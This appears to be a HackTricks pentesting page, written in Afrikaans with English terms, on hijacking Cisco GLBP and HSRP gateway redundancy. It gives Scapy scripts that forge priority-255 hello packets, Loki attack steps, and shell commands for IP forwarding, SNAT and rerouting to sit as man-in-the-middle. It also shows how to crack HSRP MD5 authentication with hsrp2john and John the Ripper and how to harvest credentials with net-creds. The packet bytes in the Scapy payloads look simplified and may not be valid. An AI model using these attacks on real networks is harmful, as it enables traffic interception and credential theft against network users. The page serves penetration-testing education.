# GLBP & HSRP Attacks

{{#include ../../banners/hacktricks-training.md}}


## FHRP Hijacking Oorsig

### Insigte oor FHRP

FHRP is ontwerp om netwerkrobustheid te bied deur meerdere routers in een virtuele eenheid saam te voeg, wat lasverdeling en foutverdraagsaamheid verbeter. Cisco Systems het prominente protokolle in hierdie suite bekendgestel, soos GLBP en HSRP.

### GLBP Protokolinsigte

Cisco se skepping, GLBP, werk op die TCP/IP-stapel en gebruik UDP op port 3222 vir kommunikasie. Routers in 'n GLBP‑groep ruil "hello" pakkette uit elke 3 sekondes. As 'n router ophou om hierdie pakkette vir 10 sekondes te stuur, word dit as offline beskou. Hierdie timers is egter nie vas nie en kan aangepas word.

GLBP vir IPv6 gebruik multicast **FF02::66** oor UDP/3222, en die virtuele MAC‑formaat word `0007.b4xx.xxyy` (AVF ID is in die laaste byte). Tye en aanvalsvlak bly dieselfde as in IPv4, dus werk hijack techniques steeds in dual‑stack netwerke.

### GLBP Operasies en Lasverdeling

GLBP onderskei homself deur lasverdeling oor routers moontlik te maak met 'n enkele virtuele IP gekombineer met veelvuldige virtuele MAC‑adresse. In 'n GLBP‑groep is elke router betrokke by pakket‑forwarding. Anders as HSRP/VRRP, bied GLBP ware lasbalansering deur verskeie meganismes:

- Host-Dependent Load Balancing: Handhaaf konsekwente AVF MAC‑adres toewysing aan 'n host, noodsaaklik vir stabiele NAT‑konfigurasies.
- Round-Robin Load Balancing: Die standaardmetode, wat AVF MAC‑adresse afwissel tussen versoekende hosts.
- Weighted Round-Robin Load Balancing: Versprei las gebaseer op voorafbepaalde "Weight"‑metrieke.

### Sleuteldele en Terminologie in GLBP

- AVG (Active Virtual Gateway): Die primêre router, verantwoordelik vir die toewysing van MAC‑adresse aan peer‑routers.
- AVF (Active Virtual Forwarder): 'n Router aangewys om netwerkverkeer te bestuur.
- GLBP Priority: 'n Metriek wat die AVG bepaal, begin standaard by 100 en wissel tussen 1 en 255.
- GLBP Weight: Reflekseer die huidige las op 'n router, verstelbaar handmatig of deur Object Tracking.
- GLBP Virtual IP Address: Dien as die netwerk se standaardgateway vir alle gekoppelde toestelle.

Vir interaksies gebruik GLBP die gereserveerde multicast‑adres 224.0.0.102 en UDP‑port 3222. Routers stuur "hello" pakkette elke 3 sekondes en word as nie‑operasioneel beskou as 'n pakket oor 'n 10‑sekonde tydperk gemis word.

### GLBP Attack Mechanism

'n Aanvaller kan die primêre router word deur 'n GLBP‑pakket te stuur met die hoogste priority‑waarde (255). Dit kan lei tot DoS of MITM attacks, wat verkeerinsae of herleiing moontlik maak.

**Praktiese GLBP hijack with Scapy (short PoC)**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
Skep die payload bytes om die GLBP header (version/opcode/priority/weight/VRID) na te boots. Deurlus van die frame verseker dat jy die AVG election wen indien authentication afwesig is.

### Uitvoering van 'n GLBP Attack met Loki

[Loki](https://github.com/raizo62/loki_on_kali) kan 'n GLBP attack uitvoer deur 'n pakket te inject met priority en weight gestel op 255. Voor-aanval stappe behels die insameling van inligting soos die virtual IP address, of authentication teenwoordig is, en router priority values deur gebruik te maak van gereedskap soos Wireshark.

Aanvalsstappe:

1. Skakel na promiscuous mode en skakel IP forwarding aan.
2. Identifiseer die teiken-router en kry sy IP.
3. Genereer 'n Gratuitous ARP.
4. Inject 'n kwaadwillige GLBP-pakket, wat die AVG imiteer.
5. Ken 'n sekondêre IP address toe aan die aanvaller se netwerk-koppelvlak, wat die GLBP virtual IP weerspieël.
6. Implementeer SNAT vir volledige verkeerssigbaarheid.
7. Pas routing aan om voortgesette internettoegang deur die oorspronklike AVG-router te verseker.

Deur hierdie stappe te volg, posisioneer die aanvaller homself as 'n "man in the middle", in staat om netwerkverkeer te onderskep en te ontleed, insluitend onversleutelde of sensitiewe data.

Vir demonstrasie, hier is die vereiste opdrag-snippets:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Monitering en onderskep van verkeer kan gedoen word met net-creds.py of soortgelyke gereedskap om data wat deur die gekompromitteerde netwerk vloei, vas te vang en te ontleed.

### Passiewe verduideliking van HSRP-kaping met opdragbesonderhede

#### Oorsig van HSRP (Hot Standby Router/Redundancy Protocol)

HSRP is 'n eiendomsprotokol van Cisco wat ontwerp is vir netwerk-gateway-redundansie. Dit maak die konfigurasie van meerdere fisiese routers in 'n enkele logiese eenheid met 'n gedeelde IP-adres moontlik. Hierdie logiese eenheid word bestuur deur 'n primêre router wat verantwoordelik is vir die rigting van verkeer. Anders as GLBP, wat metrieke soos prioriteit en gewig vir belastingbalansering gebruik, vertrou HSRP op 'n enkele aktiewe router vir verkeersbestuur.

HSRPv1 gebruik multicast **224.0.0.2** en virtuele MAC `0000.0c07.acXX`; HSRPv2 en HSRPv2 vir IPv6 gebruik **224.0.0.102 / FF02::66** en virtuele MAC `0000.0c9f.fXXX`. UDP bestemmingspoort is **1985** vir IPv4 en **2029** vir IPv6.

#### Rolle en terminologie in HSRP

- **HSRP Active Router**: Die toestel wat optree as die gateway, wat die verkeersvloei bestuur.
- **HSRP Standby Router**: 'n Rugsteun-router, gereed om oor te neem as die aktiewe router faal.
- **HSRP Group**: 'n Stel routers wat saamwerk om 'n enkele veerkragtige virtuele router te vorm.
- **HSRP MAC Address**: 'n Virtuele MAC-adres wat aan die logiese router in die HSRP-opset toegewys is.
- **HSRP Virtual IP Address**: Die virtuele IP-adres van die HSRP-groep, wat gebruik word as die verstek-gateway vir gekoppelde toestelle.

#### HSRP Weergawes

HSRP kom in twee weergawes, HSRPv1 en HSRPv2, wat hoofsaaklik verskil in groepkapasiteit, multicast IP-gebruik, en virtuele MAC-adresstruktuur. Die protokol gebruik spesifieke multicast IP-adresse vir diensinligtingsuitruiling, met Hello-pakkette wat elke 3 sekondes gestuur word. 'n Router word as inaktief beskou as geen pakket binne 'n interval van 10 sekondes ontvang word.

#### HSRP Aanvalsmeganisme

HSRP-aanvalle behels die gedwonge oorname van die rol van die Active Router deur 'n maksimum prioriteitswaarde in te spuit. Dit kan lei tot 'n Man-In-The-Middle (MITM) aanval. Essensiële voorslaanvalstappe sluit in die versameling van data oor die HSRP-opset, wat gedoen kan word met Wireshark vir verkeeranalise.

**Vinnige HSRP oorname met Scapy**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
As authentication **nie** geconfigureer is nie, dophoudende stuur van hellos met hoër prioriteit dwing peers in *Speak*/*Listen* state en laat jou toe om *Active* te word, wat verkeer deur jou gasheer herlei.

**HSRP authentication randgevalle**

- Legacy plain-text auth kan triviaal nageboots word.
- MD5 authentication dek slegs die HSRP-payload; pasgemaakte pakkette kan steeds rate-limit/DoS op die control planes veroorsaak. NX-OS releases het voorheen DoS teen geauthentiseerde groepe toegelaat (sien Cisco advisory CSCup11309).
- Op baie ISP / VPS gedeelde VLANs is HSRPv1-multicasts sigbaar vir huurders; sonder auth kan jy aansluit en verkeer preëmpt.

#### Stappe om HSRP Authentication te omseil

1. Stoor die netwerkverkeer wat HSRP-data bevat as 'n .pcap-lêer.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Onttrek MD5 hashes vanaf die .pcap-lêer met hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Kraak die MD5-hashes met John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Uitvoering van HSRP Injection met Loki**

1. Begin Loki om HSRP-advertensies te identifiseer.
2. Stel die netwerk-koppelvlak in op promiscuous mode en aktiveer IP forwarding.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Gebruik Loki om die spesifieke router te teiken, voer die gekraakte HSRP-wagwoord in, en doen die nodige konfigurasies om as die Active Router voor te doen.
4. Sodra jy die Active Router-rol verwerf het, konfigureer jou netwerk-koppelvlak en iptables om die wettige verkeer te onderskep.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Wysig die roete-tabel om verkeer deur die voormalige Active Router te lei.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Gebruik net-creds.py of 'n soortgelyke hulpmiddel om credentials vanaf die onderskepte verkeer te vang.
```shell
sudo python2 net-creds.py -i eth0
```

Die uitvoering van hierdie stappe plaas die aanvaller in 'n posisie om verkeer te onderskep en te manipuleer, soortgelyk aan die prosedure vir GLBP hijacking. Dit beklemtoon die kwesbaarheid in redundansieprotokolle soos HSRP en die behoefte aan robuuste sekuriteitsmaatreëls.

## Verwysings

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
